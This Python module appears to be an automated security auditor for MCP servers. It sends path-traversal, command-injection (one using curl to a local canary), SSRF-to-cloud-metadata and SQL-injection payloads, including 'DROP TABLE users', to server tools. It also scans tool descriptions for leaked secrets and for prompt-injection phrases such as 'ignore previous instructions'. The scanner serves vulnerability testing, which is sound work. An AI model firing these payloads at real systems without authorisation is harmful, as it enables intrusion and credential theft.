"""
Automated security auditor for MCP servers.

Tests for real vulnerabilities:
  - Path traversal in file-handling tools
  - Command injection in shell/exec tools
  - SSRF in URL-fetching tools
  - No authentication on exposed servers
  - Sensitive data exposure in tool descriptions
  - Arbitrary file write/read
  - SQL injection in database tools
  - Prompt injection in tool descriptions/responses
  - Insecure default configurations
"""
import json
import time
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any

from ..protocols.mcp_client import MCPClient, MCPTool, MCPServerInfo


@dataclass
class Finding:
    vuln_type: str = ""
    severity: str = "medium"  # critical, high, medium, low, info
    confidence: str = "confirmed"  # confirmed, likely, possible
    title: str = ""
    description: str = ""
    tool_name: str = ""
    payload: str = ""
    response: str = ""
    evidence: str = ""
    cwe: str = ""
    cvss_estimate: str = ""
    remediation: str = ""
    timestamp: float = 0.0

    def __post_init__(self):
        if self.timestamp == 0.0:
            self.timestamp = time.time()

    def to_dict(self) -> dict:
        return {
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "confidence": self.confidence,
            "title": self.title,
            "description": self.description,
            "tool_name": self.tool_name,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "cwe": self.cwe,
            "cvss_estimate": self.cvss_estimate,
            "remediation": self.remediation,
        }


@dataclass
class AuditReport:
    server_url: str = ""
    server_name: str = ""
    audit_time: float = 0.0
    findings: List[Finding] = field(default_factory=list)
    tools_tested: int = 0
    resources_tested: int = 0
    checks_run: int = 0

    def to_dict(self) -> dict:
        crit = sum(1 for f in self.findings if f.severity == "critical")
        high = sum(1 for f in self.findings if f.severity == "high")
        med = sum(1 for f in self.findings if f.severity == "medium")
        low = sum(1 for f in self.findings if f.severity == "low")
        return {
            "server_url": self.server_url,
            "server_name": self.server_name,
            "audit_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.audit_time)),
            "total_findings": len(self.findings),
            "critical": crit, "high": high, "medium": med, "low": low,
            "tools_tested": self.tools_tested,
            "checks_run": self.checks_run,
            "findings": [f.to_dict() for f in self.findings],
        }


# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
    "../../../.env",
    "../../../.ssh/authorized_keys",
    "../../../.git/config",
    "..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa",
]

# Command injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& whoami",
    "|| whoami",
    "; curl http://127.0.0.1:1337/pwned",
    "$(curl http://127.0.0.1:1337/pwned)",
    "; echo MCPwn_RCE_TEST",
    "| echo MCPwn_RCE_TEST",
    "\nid\n",
    "'; echo MCPwn_RCE_TEST; '",
    '"; echo MCPwn_RCE_TEST; "',
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.170.2/v2/credentials",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

# SQL injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1; SELECT pg_sleep(5)--",
    "' AND SLEEP(5)--",
    "' OR 1=1#",
]

# Sensitive data patterns in tool descriptions
SENSITIVE_PATTERNS = [
    (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?[\w-]{20,}", "API Key Exposure"),
    (r"(?i)(secret|token)\s*[:=]\s*['\"]?[\w-]{20,}", "Secret/Token Exposure"),
    (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?\S{4,}", "Password Exposure"),
    (r"(?i)(aws_access_key_id)\s*[:=]\s*['\"]?AK[A-Z0-9]{18}", "AWS Access Key"),
    (r"(?i)(aws_secret_access_key)\s*[:=]\s*['\"]?[\w/+=]{40}", "AWS Secret Key"),
    (r"sk-[a-zA-Z0-9]{48}", "OpenAI API Key"),
    (r"ghp_[a-zA-Z0-9]{36}", "GitHub Personal Access Token"),
    (r"(?i)mongodb(\+srv)?://[^\s]+", "MongoDB Connection String"),
    (r"(?i)postgres(ql)?://[^\s]+", "PostgreSQL Connection String"),
    (r"(?i)mysql://[^\s]+", "MySQL Connection String"),
]


class SecurityAuditor:
    """Automated security auditor for MCP servers."""

    def __init__(self, url: str, timeout: float = 10.0):
        self.url = url
        self.timeout = timeout
        self.client = MCPClient(url, timeout=timeout)
        self.report = AuditReport(server_url=url, audit_time=time.time())
        self.server_info: Optional[MCPServerInfo] = None

    def _add_finding(self, **kwargs):
        finding = Finding(**kwargs)
        self.report.findings.append(finding)
        self.report.checks_run += 1
        return finding

    def enumerate(self) -> MCPServerInfo:
        """Connect and enumerate the server."""
        self.server_info = self.client.full_enumerate()
        self.report.server_name = self.server_info.name
        self.report.tools_tested = len(self.server_info.tools)
        return self.server_info

    def check_no_auth(self) -> List[Finding]:
        """Check if server is exposed without authentication."""
        findings = []
        self.report.checks_run += 1

        if self.server_info and not self.server_info.auth_required:
            f = self._add_finding(
                vuln_type="no_authentication",
                severity="high",
                confidence="confirmed",
                title=f"MCP server '{self.server_info.name}' has no authentication",
                description=(
                    "The MCP server accepts connections without any authentication. "
                    "Any client on the network can enumerate tools, read resources, "
                    "and call tools without credentials."
                ),
                evidence=f"Server responded to initialize without auth headers",
                cwe="CWE-306: Missing Authentication for Critical Function",
                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — 9.1",
                remediation="Implement OAuth 2.0 or API key authentication on the MCP endpoint",
            )
            findings.append(f)

        # Check if bound to 0.0.0.0
        try:
            import requests as req
            resp = req.get(self.url, timeout=self.timeout)
            server_header = resp.headers.get("Server", "")
            if resp.status_code != 404:
                self.report.checks_run += 1
        except Exception:
            pass

        return findings

    def check_path_traversal(self) -> List[Finding]:
        """Test all file-handling tools for path traversal."""
        findings = []
        if not self.server_info:
            return findings

        file_tools = []
        for tool in self.server_info.tools:
            schema = tool.input_schema
            props = schema.get("properties", {})
            name_lower = tool.name.lower()
            desc_lower = tool.description.lower()

            is_file_tool = any(k in name_lower or k in desc_lower for k in
                              ["file", "read", "write", "path", "directory", "folder", "open", "load", "save"])
            has_path_param = any(k in p.lower() for p in props for k in
                               ["path", "file", "filename", "filepath", "dir", "directory", "location"])

            if is_file_tool or has_path_param:
                path_params = [p for p in props if any(k in p.lower() for k in
                              ["path", "file", "filename", "filepath", "dir", "directory", "location"])]
                file_tools.append((tool, path_params))

        for tool, path_params in file_tools:
            for param in path_params:
                for payload in PATH_TRAVERSAL_PAYLOADS:
                    self.report.checks_run += 1
                    args = {param: payload}
                    # Fill other required params with dummy values
                    required = tool.input_schema.get("required", [])
                    for req_param in required:
                        if req_param not in args:
                            args[req_param] = "test"

                    result = self.client.call_tool(tool.name, args)
                    resp_str = json.dumps(result)

                    # Check for path traversal success indicators
                    traversal_indicators = [
                        "root:", "/bin/bash", "/bin/sh",  # /etc/passwd
                        "127.0.0.1", "localhost",  # /etc/hosts
                        "[core]", "repositoryformatversion",  # .git/config
                        "DB_PASSWORD", "DATABASE_URL", "SECRET_KEY",  # .env
                        "ssh-rsa", "ssh-ed25519",  # .ssh/
                        "# Host Database",  # Windows hosts
                    ]

                    for indicator in traversal_indicators:
                        if indicator in resp_str:
                            f = self._add_finding(
                                vuln_type="path_traversal",
                                severity="critical",
                                confidence="confirmed",
                                title=f"Path Traversal in tool '{tool.name}' parameter '{param}'",
                                description=(
                                    f"The tool '{tool.name}' is vulnerable to path traversal. "
                                    f"An attacker can read arbitrary files on the server by "
                                    f"providing path traversal sequences in the '{param}' parameter."
                                ),
                                tool_name=tool.name,
                                payload=payload,
                                response=resp_str[:500],
                                evidence=f"Response contains '{indicator}' from {payload}",
                                cwe="CWE-22: Path Traversal",
                                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — 7.5",
                                remediation="Validate and sanitize file paths. Use allowlists for accessible directories.",
                            )
                            findings.append(f)
                            break

                    # Check for error messages that leak path info
                    error_patterns = [
                        r"(ENOENT|EACCES|EPERM).*(/[a-zA-Z0-9/_.-]+)",
                        r"(FileNotFoundError|PermissionError).*['\"](/[^'\"]+)['\"]",
                        r"(No such file|Permission denied).*['\"](/[^'\"]+)['\"]",
                    ]
                    for pattern in error_patterns:
                        match = re.search(pattern, resp_str)
                        if match:
                            self._add_finding(
                                vuln_type="path_disclosure",
                                severity="low",
                                confidence="confirmed",
                                title=f"Path disclosure in tool '{tool.name}' error",
                                description=f"Error messages reveal server filesystem paths",
                                tool_name=tool.name,
                                payload=payload,
                                evidence=match.group(0),
                                cwe="CWE-209: Information Exposure Through Error Message",
                                remediation="Sanitize error messages to not reveal filesystem paths",
                            )
                            break

        return findings

    def check_command_injection(self) -> List[Finding]:
        """Test tools that execute commands for injection."""
        findings = []
        if not self.server_info:
            return findings

        exec_tools = []
        for tool in self.server_info.tools:
            name_lower = tool.name.lower()
            desc_lower = tool.description.lower()
            props = tool.input_schema.get("properties", {})

            is_exec = any(k in name_lower or k in desc_lower for k in
                         ["exec", "run", "command", "shell", "bash", "cmd", "execute",
                          "script", "terminal", "process", "system", "eval", "spawn"])
            has_cmd_param = any(k in p.lower() for p in props for k in
                              ["command", "cmd", "script", "query", "code", "input", "args", "expression"])

            if is_exec or has_cmd_param:
                cmd_params = [p for p in props if any(k in p.lower() for k in
                             ["command", "cmd", "script", "query", "code", "input", "args",
                              "expression", "name", "value"])]
                if not cmd_params:
                    cmd_params = list(props.keys())[:2]
                exec_tools.append((tool, cmd_params))

        for tool, cmd_params in exec_tools:
            for param in cmd_params:
                for payload in COMMAND_INJECTION_PAYLOADS:
                    self.report.checks_run += 1
                    args = {param: payload}
                    required = tool.input_schema.get("required", [])
                    for req_param in required:
                        if req_param not in args:
                            args[req_param] = "test"

                    result = self.client.call_tool(tool.name, args)
                    resp_str = json.dumps(result)

                    rce_indicators = [
                        "uid=", "gid=", "groups=",  # id command
                        "MCPwn_RCE_TEST",  # our canary
                        "root:x:0:0",  # /etc/passwd
                        "COMPUTERNAME=", "USERNAME=",  # Windows
                    ]

                    for indicator in rce_indicators:
                        if indicator in resp_str:
                            f = self._add_finding(
                                vuln_type="command_injection",
                                severity="critical",
                                confidence="confirmed",
                                title=f"Command Injection in tool '{tool.name}' parameter '{param}'",
                                description=(
                                    f"The tool '{tool.name}' is vulnerable to OS command injection. "
                                    f"An attacker can execute arbitrary commands on the server."
                                ),
                                tool_name=tool.name,
                                payload=payload,
                                response=resp_str[:500],
                                evidence=f"Response contains '{indicator}' — command executed",
                                cwe="CWE-78: OS Command Injection",
                                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — 9.8",
                                remediation="Never pass user input to shell commands. Use parameterized APIs.",
                            )
                            findings.append(f)
                            break
        return findings

    def check_ssrf(self) -> List[Finding]:
        """Test URL-fetching tools for SSRF."""
        findings = []
        if not self.server_info:
            return findings

        url_tools = []
        for tool in self.server_info.tools:
            name_lower = tool.name.lower()
            desc_lower = tool.description.lower()
            props = tool.input_schema.get("properties", {})

            is_url_tool = any(k in name_lower or k in desc_lower for k in
                             ["fetch", "url", "http", "request", "download", "browse",
                              "scrape", "crawl", "get", "webhook", "api", "proxy"])
            has_url_param = any(k in p.lower() for p in props for k in
                              ["url", "uri", "href", "link", "endpoint", "address", "target"])

            if is_url_tool or has_url_param:
                url_params = [p for p in props if any(k in p.lower() for k in
                             ["url", "uri", "href", "link", "endpoint", "address", "target"])]
                if not url_params:
                    url_params = list(props.keys())[:1]
                url_tools.append((tool, url_params))

        for tool, url_params in url_tools:
            for param in url_params:
                for payload in SSRF_PAYLOADS:
                    self.report.checks_run += 1
                    args = {param: payload}
                    required = tool.input_schema.get("required", [])
                    for req_param in required:
                        if req_param not in args:
                            args[req_param] = "test"

                    result = self.client.call_tool(tool.name, args)
                    resp_str = json.dumps(result)

                    ssrf_indicators = [
                        "ami-", "instance-id", "security-credentials",  # AWS metadata
                        "computeMetadata", "project-id",  # GCP metadata
                        "redis_version", "connected_clients",  # Redis
                        "root:x:0:0",  # file:// read
                    ]

                    for indicator in ssrf_indicators:
                        if indicator in resp_str:
                            f = self._add_finding(
                                vuln_type="ssrf",
                                severity="critical",
                                confidence="confirmed",
                                title=f"SSRF in tool '{tool.name}' parameter '{param}'",
                                description=(
                                    f"The tool '{tool.name}' is vulnerable to Server-Side Request Forgery. "
                                    f"An attacker can make the server send requests to internal services, "
                                    f"cloud metadata endpoints, and internal network resources."
                                ),
                                tool_name=tool.name,
                                payload=payload,
                                response=resp_str[:500],
                                evidence=f"Response contains '{indicator}' from internal request",
                                cwe="CWE-918: Server-Side Request Forgery",
                                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N — 8.6",
                                remediation="Validate and restrict URLs. Block requests to internal IPs and cloud metadata.",
                            )
                            findings.append(f)
                            break
        return findings

    def check_sensitive_data(self) -> List[Finding]:
        """Check tool descriptions and responses for leaked secrets."""
        findings = []
        if not self.server_info:
            return findings

        for tool in self.server_info.tools:
            self.report.checks_run += 1
            text = f"{tool.name} {tool.description} {json.dumps(tool.input_schema)}"
            for pattern, vuln_name in SENSITIVE_PATTERNS:
                match = re.search(pattern, text)
                if match:
                    f = self._add_finding(
                        vuln_type="sensitive_data_exposure",
                        severity="high",
                        confidence="confirmed",
                        title=f"{vuln_name} in tool '{tool.name}' metadata",
                        description=f"Tool description or schema contains sensitive data: {vuln_name}",
                        tool_name=tool.name,
                        evidence=match.group(0)[:50] + "...",
                        cwe="CWE-200: Exposure of Sensitive Information",
                        remediation="Remove credentials and secrets from tool descriptions and schemas",
                    )
                    findings.append(f)
        return findings

    def check_prompt_injection(self) -> List[Finding]:
        """Check tool descriptions for prompt injection payloads."""
        findings = []
        if not self.server_info:
            return findings

        injection_patterns = [
            (r"(?i)ignore\s+(previous|all|above)\s+(instructions|prompts)", "Instruction Override"),
            (r"(?i)you\s+are\s+now\s+", "Role Hijacking"),
            (r"(?i)system\s*:\s*", "System Prompt Injection"),
            (r"(?i)do\s+not\s+tell\s+the\s+user", "Hidden Instruction"),
            (r"(?i)instead\s+of\s+(what|your|the)\s+", "Behavior Override"),
            (r"(?i)(exfiltrate|send|leak|transmit)\s+.*(data|information|secret|key)", "Data Exfiltration Instruction"),
            (r"<\|.*?\|>", "Special Token Injection"),
            (r"```system", "System Block Injection"),
        ]

        for tool in self.server_info.tools:
            self.report.checks_run += 1
            text = f"{tool.description} {json.dumps(tool.annotations)}"
            for pattern, vuln_name in injection_patterns:
                match = re.search(pattern, text)
                if match:
                    f = self._add_finding(
                        vuln_type="prompt_injection",
                        severity="high",
                        confidence="likely",
                        title=f"Prompt Injection ({vuln_name}) in tool '{tool.name}'",
                        description=(
                            f"Tool description contains text that could manipulate an AI agent's behavior. "
                            f"Pattern: {vuln_name}"
                        ),
                        tool_name=tool.name,
                        evidence=match.group(0),
                        cwe="CWE-94: Code Injection (Prompt Injection variant)",
                        remediation="Sanitize tool descriptions. Implement tool description validation.",
                    )
                    findings.append(f)
        return findings

    def check_sql_injection(self) -> List[Finding]:
        """Test database tools for SQL injection."""
        findings = []
        if not self.server_info:
            return findings

        db_tools = []
        for tool in self.server_info.tools:
            name_lower = tool.name.lower()
            desc_lower = tool.description.lower()
            props = tool.input_schema.get("properties", {})

            is_db = any(k in name_lower or k in desc_lower for k in
                       ["sql", "query", "database", "db", "select", "insert", "table"])
            if is_db:
                query_params = [p for p in props if any(k in p.lower() for k in
                               ["query", "sql", "statement", "filter", "where", "search", "id"])]
                if not query_params:
                    query_params = list(props.keys())[:2]
                db_tools.append((tool, query_params))

        for tool, query_params in db_tools:
            for param in query_params:
                for payload in SQL_INJECTION_PAYLOADS:
                    self.report.checks_run += 1
                    args = {param: payload}
                    required = tool.input_schema.get("required", [])
                    for req_param in required:
                        if req_param not in args:
                            args[req_param] = "1"

                    result = self.client.call_tool(tool.name, args)
                    resp_str = json.dumps(result)

                    sqli_indicators = [
                        "syntax error", "SQL syntax", "mysql_fetch",
                        "pg_query", "sqlite3.OperationalError",
                        "UNION", "SELECT", "table_name",
                        "information_schema",
                    ]
                    for indicator in sqli_indicators:
                        if indicator.lower() in resp_str.lower():
                            f = self._add_finding(
                                vuln_type="sql_injection",
                                severity="critical",
                                confidence="likely",
                                title=f"SQL Injection in tool '{tool.name}' parameter '{param}'",
                                description=f"Database error suggests SQL injection vulnerability",
                                tool_name=tool.name,
                                payload=payload,
                                response=resp_str[:500],
                                evidence=f"Response contains SQL indicator: '{indicator}'",
                                cwe="CWE-89: SQL Injection",
                                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — 9.8",
                                remediation="Use parameterized queries. Never concatenate user input into SQL.",
                            )
                            findings.append(f)
                            break
        return findings

    def check_arbitrary_file_write(self) -> List[Finding]:
        """Test for arbitrary file write in write-capable tools."""
        findings = []
        if not self.server_info:
            return findings

        for tool in self.server_info.tools:
            name_lower = tool.name.lower()
            desc_lower = tool.description.lower()
            props = tool.input_schema.get("properties", {})

            is_write = any(k in name_lower or k in desc_lower for k in
                          ["write", "save", "create", "upload", "put", "store"])
            has_path = any(k in p.lower() for p in props for k in
                         ["path", "file", "filename", "destination", "output"])

            if is_write and has_path:
                self.report.checks_run += 1
                # Check if path is restricted
                path_param = next((p for p in props if any(k in p.lower() for k in
                                  ["path", "file", "filename"])), None)
                if path_param:
                    # Try writing to sensitive locations
                    test_paths = [
                        "/tmp/mcpwn_write_test_" + str(int(time.time())),
                        "../../../tmp/mcpwn_write_test",
                    ]
                    for test_path in test_paths:
                        args = {path_param: test_path}
                        content_param = next((p for p in props if any(k in p.lower() for k in
                                            ["content", "data", "text", "body"])), None)
                        if content_param:
                            args[content_param] = "MCPwn_WRITE_TEST"
                        required = tool.input_schema.get("required", [])
                        for req_param in required:
                            if req_param not in args:
                                args[req_param] = "test"

                        result = self.client.call_tool(tool.name, args)
                        resp_str = json.dumps(result)

                        if "error" not in resp_str.lower() or "success" in resp_str.lower():
                            f = self._add_finding(
                                vuln_type="arbitrary_file_write",
                                severity="critical",
                                confidence="likely",
                                title=f"Arbitrary File Write in tool '{tool.name}'",
                                description=(
                                    f"The tool '{tool.name}' allows writing to arbitrary file paths "
                                    f"including path traversal. An attacker can overwrite system files, "
                                    f".bashrc, .ssh/authorized_keys, cron jobs, etc."
                                ),
                                tool_name=tool.name,
                                payload=test_path,
                                response=resp_str[:300],
                                cwe="CWE-22: Path Traversal + CWE-73: External Control of File Name",
                                cvss_estimate="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H — 9.1",
                                remediation="Restrict write paths to an allowlisted directory. Validate all file paths.",
                            )
                            findings.append(f)
                            break
        return findings

    def full_audit(self) -> AuditReport:
        """Run all security checks against the server."""
        self.enumerate()
        self.check_no_auth()
        self.check_sensitive_data()
        self.check_prompt_injection()
        self.check_path_traversal()
        self.check_command_injection()
        self.check_ssrf()
        self.check_sql_injection()
        self.check_arbitrary_file_write()

        # Sort findings by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        self.report.findings.sort(key=lambda f: severity_order.get(f.severity, 5))
        return self.report
